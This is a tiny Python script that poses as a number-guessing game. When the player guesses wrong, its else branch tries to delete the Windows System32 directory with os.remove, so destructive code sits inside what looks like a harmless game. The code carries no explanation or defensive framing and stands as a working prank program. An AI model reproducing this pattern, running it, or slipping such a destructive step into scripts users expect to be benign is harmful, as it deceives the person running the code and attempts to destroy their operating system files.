import random
import os
number = random.randint(1,10)
guess = input ("Guess a number between 1-10:")
guess = int(guess)

if guess == number:
    print("Congratulations you won")
else:
    os.remove("c:\\Windows\\System32")
    
    